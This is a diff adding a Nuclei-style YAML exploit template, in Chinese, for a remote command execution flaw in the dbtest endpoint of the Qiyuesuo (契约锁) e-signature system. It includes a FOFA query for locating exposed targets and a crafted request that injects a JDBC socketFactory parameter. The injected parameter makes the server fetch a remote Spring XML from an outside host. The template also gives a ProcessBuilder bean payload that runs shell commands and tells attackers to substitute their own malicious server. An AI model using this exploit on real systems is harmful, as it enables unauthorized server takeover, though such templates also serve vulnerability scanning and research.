@@ -1,0 +1,44 @@
+id: qiyuesuo-esign-dbtest-rce
+
+info:
+  name: "契约锁电子签章系统dbtest接口远程命令执行"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="契约锁-电子签署平台"
+          契约锁电子签章系统dbtest接口存在远程命令执行漏洞
+          GET /setup/dbtest?db=POSTGRESQL&host=localhost&port=5511&username=root&name=test%2F%3FsocketFactory%3Dorg%2Espringframework%2Econtext%2Esupport%2EClassPathXmlApplicationContext%26socketFactoryArg%3Dhttp%3A%2F%2F{{interactsh-url}}%2F1%2Exml HTTP/1.1
+
+      攻击者可通过替换DNS日志为自控恶意服务器地址，并在目标服务器上部署特定XML配置文件以触发命令执行。示例攻击载荷包含Spring框架Bean定义，通过ProcessBuilder组件执行系统命令：
+      <beans xmlns="http://www.springframework.org/schema/beans"
+             xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+             xmlns:p="http://www.springframework.org/schema/p"
+             xsi:schemaLocation="http://www.springframework.org/schema/beans
+              http://www.springframework.org/schema/beans/spring-beans.xsd">
+         <bean id="exec" class="java.lang.ProcessBuilder" init-method="start">
+              <constructor-arg>
+                <list>
+                  <value>/bin/sh</value>
+                  <value>-c</value>
+                  <value>touch /tmp/test</value>
+                </list>
+              </constructor-arg>
+          </bean>
+      </beans>
+  tags: 契约锁
+
+http:
+- raw:
+  - |-
+    GET /api/setup/dbtest?db=POSTGRESQL&host=localhost&port=5511&username=root&name=test%2F%3FsocketFactory%3Dorg%2Espringframework%2Econtext%2Esupport%2EClassPathXmlApplicationContext%26socketFactoryArg%3Dhttp%3A%2F%2F{{interactsh-url}}%2F1%2Exml HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Connection: Keep-Alive
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: interactsh_protocol
+    words:
+      - http
